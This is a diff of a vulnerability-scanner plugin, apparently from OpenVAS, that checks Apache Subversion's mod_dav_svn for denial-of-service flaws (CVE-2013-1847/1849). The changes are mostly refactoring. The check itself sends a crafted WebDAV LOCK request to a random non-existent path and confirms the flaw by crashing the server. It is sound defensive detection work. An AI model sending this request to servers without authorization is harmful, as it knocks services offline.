@@ -7,11 +7,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802055");
-  script_version("2023-07-21T05:05:22+0000");
+  script_version("2024-01-26T05:05:14+0000");
   script_cve_id("CVE-2013-1847", "CVE-2013-1849");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
+  script_tag(name:"last_modification", value:"2024-01-26 05:05:14 +0000 (Fri, 26 Jan 2024)");
   script_tag(name:"creation_date", value:"2013-06-11 12:32:36 +0530 (Tue, 11 Jun 2013)");
   script_name("Apache Subversion 'mod_dav_svn' Module Multiple DoS Vulnerabilities");
   script_xref(name:"URL", value:"http://secunia.com/advisories/52966/");
@@ -57,86 +57,80 @@ include("port_service_func.inc");
 include("list_array_func.inc");
 include("misc_func.inc");
 
-h_port = http_get_port(default:80);
+port = http_get_port(default:80);
 
-banner = http_get_remote_headers(port: h_port);
-if(!banner || banner !~ "Server: Apache.* SVN"){
+banner = http_get_remote_headers(port: port);
+if(!banner || banner !~ "Server\s*:\s*Apache.* SVN")
   exit(0);
-}
 
 useragent = http_get_user_agent();
-host = http_host_name(port:h_port);
+host = http_host_name(port:port);
 
-if(http_is_dead(port:h_port)) exit(0);
+if(http_is_dead(port:port))
+  exit(0);
 
-## LOCK request body
+# nb: LOCK request body
 lock_body = string('<?xml version="1.0" encoding="UTF-8"?>\n',
-                     "<D:lockinfo xmlns:D='DAV:'>\n",
-                     '<D:lockscope><D:exclusive/></D:lockscope>\n',
-                     '<D:locktype><D:write/></D:locktype>\n',
-                     '<D:owner>\n',
-                     '<D:href>http://test.test</D:href>\n',
-                     '</D:owner>\n',
-                     '</D:lockinfo>\n');
+                   "<D:lockinfo xmlns:D='DAV:'>\n",
+                   '<D:lockscope><D:exclusive/></D:lockscope>\n',
+                   '<D:locktype><D:write/></D:locktype>\n',
+                   '<D:owner>\n',
+                   '<D:href>http://test.test</D:href>\n',
+                   '</D:owner>\n',
+                   '</D:lockinfo>\n');
 
-foreach path (make_list_unique("/", "/repo/", "/repository/", "/trunk/", "/svn/",
-                        "/svn/trunk/", "/repo/trunk/", "/repo/projects/",
-                        "/projects/", "/svn/repos/", http_cgi_dirs(port:h_port)))
-{
-  req1 = http_get(item:string(path), port:h_port);
-  res1 = http_keepalive_send_recv(port:h_port, data:req1);
+foreach dir(make_list_unique("/", "/repo", "/repository", "/trunk", "/svn",
+                             "/svn/trunk", "/repo/trunk", "/repo/projects",
+                             "/projects", "/svn/repos", http_cgi_dirs(port:port))) {
 
-  if((res1 !~ "^HTTP/1\.[01] 200")){
+  if(dir == "/")
+    dir = "";
+
+  url = dir + "/";
+  req1 = http_get(item:url, port:port);
+  res1 = http_keepalive_send_recv(port:port, data:req1);
+  if(!res1 || res1 !~ "^HTTP/1\.[01] 200")
     continue;
-  }
 
-  ## Send normal request and check for normal response to confirm
-  ## Subversion is working as expected
-  proper_path = string("LOCK ", path, " HTTP/1.1","\r\n");
+  # nb: Send normal request and check for normal response to confirm. Subversion is working as expected.
+  proper_path = string("LOCK ", url, " HTTP/1.1", "\r\n");
   common_req = string("User-Agent: ", useragent, "\r\n",
                       "Host: ", host, "\r\n",
                       "Accept: */*\r\n", "Content-Length: ",
                       strlen(lock_body), "\r\n\r\n", lock_body);
 
   normal_req = string(proper_path, common_req);
-  normal_res = http_keepalive_send_recv(port:h_port, data:normal_req);
-
-  if(normal_res =~ "^HTTP/1\.[01] 405"){
+  normal_res = http_keepalive_send_recv(port:port, data:normal_req);
+  if(normal_res =~ "^HTTP/1\.[01] 405")
     continue;
-  }
 
-  ## non-existent paths
+  # nb: non-existent path
   rand_path = rand_str(length:8);
 
-  non_existant_path = string("LOCK ", path, rand_path, " HTTP/1.1","\r\n");
+  non_existant_path = string("LOCK ", url, rand_path, " HTTP/1.1", "\r\n");
 
-  ## Some time Apache servers will re-spawn the listener processes
-  ## send non-existent path and check for the response.
-  ## If no response than Segmentation fault occurred
+  # nb: Some time Apache servers will re-spawn the listener processes. Send a non-existent path
+  # and check for the response. If no response is received then a Segmentation fault occurred.
   crafted_req = string(non_existant_path, common_req);
-  crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);
+  crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);
 
-  ## patched/non-vulnerable version repose HTTP/1.1 401 Authorization Required
-  if(crafted_res =~ "^HTTP/1\.[01] 401"){
+  # nb: patched/non-vulnerable version repose HTTP/1.1 401 Authorization Required
+  if(crafted_res =~ "^HTTP/1\.[01] 401")
     exit(0);
-  }
 
-  ## some times response has "\r\n" hence check strlen(crafted_res) < 3
-  ## nb: Trying 2 times to make sure module is crashing
-  if(isnull(crafted_res) || strlen(crafted_res) < 3)
-  {
-    crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);
-    if(isnull(crafted_res) || strlen(crafted_res) < 3)
-    {
-      security_message(port:h_port);
+  # nb: Some times response has "\r\n" hence check strlen(crafted_res) < 3
+  # nb: Trying 2 times to make sure module is crashing
+  if(isnull(crafted_res) || strlen(crafted_res) < 3) {
+    crafted_res = http_keepalive_send_recv(port:port, data:crafted_req);
+    if(isnull(crafted_res) || strlen(crafted_res) < 3) {
+      security_message(port:port);
       exit(0);
     }
   }
 
-  ## If http did not re-spawn the listener processes
-  if(http_is_dead(port:h_port))
-  {
-    security_message(port:h_port);
+  # nb: If HTTP did not re-spawn the listener processes
+  if(http_is_dead(port:port)) {
+    security_message(port:port);
     exit(0);
   }
 }
